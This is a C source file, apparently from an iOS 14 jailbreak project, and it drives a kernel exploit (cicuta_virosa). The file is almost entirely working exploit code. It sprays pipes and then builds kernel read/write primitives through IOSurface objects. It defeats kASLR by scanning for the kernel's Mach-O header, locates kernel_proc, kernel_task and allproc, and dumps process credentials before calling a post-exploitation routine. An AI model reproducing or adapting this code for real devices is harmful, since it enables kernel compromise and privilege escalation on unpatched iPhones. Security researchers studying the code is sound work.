//
//  exploit_main.c
//  pre-jailbreak
//
//  Created by Quote on 2021/2/19.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/time.h>
#include <mach/mach.h>

#include "mycommon.h"
#include "k_offsets.h"
#include "utils.h"
#include "k_utils.h"
#include "../utils/KernelRwWrapper.h"
#include "user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;
uint64_t kernel_proc = 0;
uint64_t all_proc = 0;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

uint64_t find_all_proc(void){
    uint64_t proc = rk64(g_exp.kernel_proc + 8);
    while (proc != 0) {
        uint64_t prevProc = rk64(proc + 8);
       // badLog("prevproc: 0x%llX", prevProc);
        uint32_t pid = rk32(proc + 0x68);
       // badLog("pid: %llX", pid);
        if(pid == 0){
            util_printf("Có thể đã tìm thấy allproc...\n");
            all_proc = proc;
            util_info("allproc: 0x%llX", all_proc);
            break;
        }
        if (prevProc == 0) {
            fail_info("Không thể tìm thấy allProc\n");
            all_proc = 0;
            break;
        } if (rk64(prevProc) != proc){
            util_info("Allproc 0x%llX", proc);
            all_proc = proc;
            break;
        }
        proc = prevProc;
    }
    
    
    return 0;
}
uint64_t fin_kern_proc(void){
    uint64_t proc = g_exp.self_proc;
    uint32_t pid = 0;
    while (proc != 0) {
        pid = rk32(proc + 0x68);
      //  badLog("pid: 0x%llX", pid);
        if (pid == 0){
            util_printf("Thành lập kernproc\n");
            kernel_proc = proc;
            util_info("kern_proc: 0x%llX", kernel_proc);
            break;
        }
        proc = rk64(proc);
       // badLog("proc: 0x%llX", proc);
    }
    return 0;
}


void exploit_main(void)
{
    sys_init();
    kernel_offsets_init();
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id: %u", surf_id);
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);
    // open the door to iOS 14
    cicuta_virosa();
    gettimeofday(&tv2, NULL);
    uint64_t cost = (tv2.tv_sec - tv1.tv_sec) * 1000 * 1000 + tv2.tv_usec - tv1.tv_usec;
    util_info("cost: %.3f seconds", cost / 1000000.0);

    util_info("self_task: %llX", g_exp.self_task);
    g_exp.self_ipc_space = rk64ptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = our_proc_kAddr;

    IOSurfaceRoot_uc = port_name_to_kobject(IOSurfaceRootUserClient);
    kptr_t surfaceClients = rk64ptr(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    kptr_t IOSurfaceClient_obj = rk64ptr(surfaceClients + sizeof(kptr_t) * surf_id);

    util_info("build stable kernel r/w primitives");
    util_info("---- done ----");

    kptr_t vt_ptr = rk64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }

    util_info("defeat kASLR");

    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_2; // OSObject::release
    IOSurfaceClient_vt = rk64ptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_2 = rk64ptr(IOSurfaceClient_vt + 2 * sizeof(kptr_t));

    util_info("vt: %#llX, vt[2]: %#llX", IOSurfaceClient_vt, IOSurfaceClient_vt_2);
    util_msleep(100);

    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
    uint32_t data[4];
    kptr_t kernel_base = IOSurfaceClient_vt_2; // located in __TEXT_EXEC
    kernel_base &= ~(g_exp.pagesize - 1);
    while (1) {
        kread(kernel_base, data, sizeof(mach_header));
        data[2] = mach_header[2]; // ignore CPU subtype
        if (!memcmp(mach_header, data, sizeof(mach_header))) {
            break; // found
        }
        kernel_base -= g_exp.pagesize;
    }
    g_exp.kernel_base = kernel_base;
    g_exp.kernel_slide = kernel_base - kc_kernel_base;
    // assume that kc_kernel_base always equals to 0xFFFFFFF007004000
    util_info("kernel base: %#llX", g_exp.kernel_base);
    util_info("kernel slide: %#llX",g_exp.kernel_slide);
    g_exp.kernel_proc = kproc_find_pid0(g_exp.self_proc);
    g_exp.kernel_task = rk64ptr(g_exp.kernel_proc + OFFSET(proc, task));
    util_info("kernel_proc: %#llX", g_exp.kernel_proc);
    util_info("kernel_task: %#llX", g_exp.kernel_task);
    g_exp.kernel_map = rk64ptr(g_exp.kernel_task + OFFSET(task, map));
    util_info("kernel_map: %#llX", g_exp.kernel_map);

    // device&OS dependent
    // end

    g_exp.self_proc = kproc_find_by_pid(getpid());
    util_info("self_proc: %#llX", g_exp.self_proc);
    util_msleep(100);

    g_exp.self_task = rk64ptr(g_exp.self_proc + OFFSET(proc, task));
    g_exp.self_ipc_space = rk64ptr(g_exp.self_task + OFFSET(task, itk_space));
    util_info("self_task: %#llX", g_exp.self_ipc_space);
    util_info("self_ipc_space: %#llX", g_exp.self_ipc_space);
    find_all_proc();
#ifdef MAINAPP
    ksetOffsets(g_exp.kernel_slide + 0xFFFFFFF007004000, g_exp.kernel_proc, all_proc);
#endif
    if (g_exp.debug) {
        util_info("---- dump kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- dump self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }

    post_exploit();

    // clean KHEAP by yourself
}
